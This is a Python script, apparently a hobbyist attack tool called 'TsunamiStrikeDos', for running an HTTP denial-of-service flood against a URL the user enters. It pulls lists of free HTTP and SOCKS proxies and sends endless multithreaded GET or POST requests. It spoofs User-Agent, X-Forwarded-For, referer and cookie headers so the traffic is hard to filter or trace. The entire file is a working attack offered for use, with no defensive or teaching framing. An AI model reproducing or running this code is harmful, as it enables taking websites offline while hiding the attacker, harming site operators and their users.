import json
import random
import sys
import warnings
import string
import threading
import time
from typing import Dict, List
import requests
import faker
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout
from fake_useragent import UserAgent
import os
from halo import Halo



os.system('clear')
__version__ = '5.0'
__method__ = 'HTTP'
#  
# --------------------------------------

sip = Halo()
print(f'''
{F.WHITE} TSD TOOL {F.GREEN} |{F.WHITE} HTTP PROXY FLOOD {F.GREEN} |{F.WHITE} BY ALM7MDY
{F.GREEN}
▄▄▄█████▓  ██████ ▓█████▄ 
▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
▒ ▓██░ ▒░░ ▓██▄   ░██   █▌
░ ▓██▓ ░   ▒   ██▒░▓█▄   ▌
  ▒██▒ ░ ▒██████▒▒░▒████▓ 
  ▒ ░░   ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ 
    ░    ░ ░▒  ░ ░ ░ ▒  ▒ 
  ░      ░  ░  ░   ░ ░  ░ 
               ░     ░    
                   ░      

                {F.CYAN} TsunamiStrikeDos V{F.GREEN} {__version__}{F.RESET}

''')
print('_'*40)

# -------------------------------------------
sip.succeed(f'Method: {__method__}')
fake = faker.Faker()

def emailCreateFake():
    e = string.ascii_lowercase + string.digits + string.digits
    leng = random.randint(6,10)

    email_1 = ''.join(random.choice(e) for _ in range(leng))
    listMe = ['@hotmail.com', '@live.com', '@gmail.com', '@yahoo.com']
    ranListMe = random.choice(listMe)
    email = email_1 + ranListMe
    return email


def generate_random_cookies() -> Dict[str, str]:
    """Generate random cookies."""
    cookie_count = random.randint(1, 5)  # عدد الكوكيز العشوائية
    cookies = {}
    for _ in range(cookie_count):
        key = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        cookies[key] = value
    return cookies

def buildBlock(size):

    block = ''.join(random.choice(string.ascii_letters) for _ in range(size))
    return block

def dataRandom():
    return {
        'name': fake.name(),
        'message': buildBlock(random.randint(50,80))+'='+buildBlock(random.randint(50,80)),
        'email': emailCreateFake()
    }

warnings.filterwarnings("ignore", message="Unverified HTTPS request")


def get_http_proxies() -> List[Dict[str, str]]:
    """Return a list of available proxies from both HTTP and SOCKS4."""
    proxies = []
    try:
        timeoutrand = random.randint(1000,50000)
        #print(timeoutrand)
        # Fetch HTTP proxies
        with requests.get(
            f"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout={timeoutrand}",
            verify=False,
        ) as proxy_list_http:
            proxies_http = [
                {"http": proxy, "https": proxy}
                for proxy in proxy_list_http.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_http)

        # Fetch SOCKS4 proxies
        with requests.get(
            f"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4,socks5&proxy_format=ipport&format=text&timeout={timeoutrand}",
            verify=False,
        ) as proxy_list_socks4:
            proxies_socks4 = [
                {"socks4": proxy, "socks4": proxy}
                for proxy in proxy_list_socks4.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_socks4)

    except Timeout:
        print(f"\n{F.RED}( !!! ) {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}( !!! ) {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

proxies = get_http_proxies()

# Create UserAgent instance
ua = UserAgent()

def generate_headers():
    """Generate more advanced headers to mimic real requests."""
    headers = {
        "User-Agent": ua.random,  # Use random User-Agent
        "X-Requested-With": random.choice(["XMLHttpRequest", "FetchRequest"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Pragma": random.choice(["no-cache", "private"]),
        "Cache-Control": random.choice(["no-cache", "no-store", "must-revalidate"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "identity"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"]),
        "Referer": random.choice([
            "https://www.google.com", 
            "https://www.bing.com", 
            "https://www.yahoo.com", 
            "https://www.youtube.com",
            "https://www.instagram.com", 
            "https://www.facebook.com/"
        ]),
        "DNT": "1",  # Do Not Track header
        "Upgrade-Insecure-Requests": "1",  # Common in browser requests
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*",
            "*/*"
        ]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "X-Forwarded-For": fake.ipv4(),
        "Origin": random.choice([
            "https://example.com",
            "https://testsite.org",
            "https://mywebsite.net"
        ])
    }
    random_cookies = generate_random_cookies()
    headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in random_cookies.items()])

    return headers


def flood(target: str) -> None:
    """Start an HTTP GET request flood through proxies."""
    global proxies

    request_type = random.choice([
        "GET",
        "POST"
    ])

    fakedata = dataRandom()
    request_count = 0
    while True:  # Keep flooding until the program is stopped
        headers = generate_headers()
        headers["User-Agent"] = ua.random
        headers["X-Forwarded-For"] = fake.ipv4()
        random_cookies = generate_random_cookies()
        headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in random_cookies.items()])

        if request_count % 50 == 0:
            timeoutrand = random.randint(1000,50000)
        try:
            proxy = random.choice(proxies)

            if request_type == "POST":

                response = requests.post(target, headers=headers, proxies=proxy, timeout=5)
            else:
                response = requests.get(target , headers=headers, proxies=proxy, timeout=5)
            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
            payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
            proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
            ip_fake = f"IP: {headers['X-Forwarded-For']}"
            request_info = f"{F.CYAN}{request_type}{F.RESET}"
            print(f"{status}: {request_info} Successful Attack! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
            request_count +=1
        except (Timeout, OSError):
            continue
        if response.status_code != 200:
            try:
                proxies.remove(proxy)
            except ValueError:
                proxies = get_http_proxies()

def start_flooding(target: str, thread_count: int, duration: int) -> None:
    """Start multiple threads to flood the target."""
    stop_time = time.time() + duration  # Calculate end time
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True  # Allow threads to exit when main program exits
        thread.start()

    while time.time() < stop_time:
        time.sleep(sleeptime)  # Keep the main thread alive until duration ends

    print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attack finished after {duration} seconds.{F.RESET}")

if __name__ == "__main__":
    target_url = input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}\n''')
    num_threads = int(input(f'''\n{F. CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))
    duration = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}\'''))
    sleeptime = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW})~ Sleep Time{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))

    start_flooding(target_url, num_threads, duration)

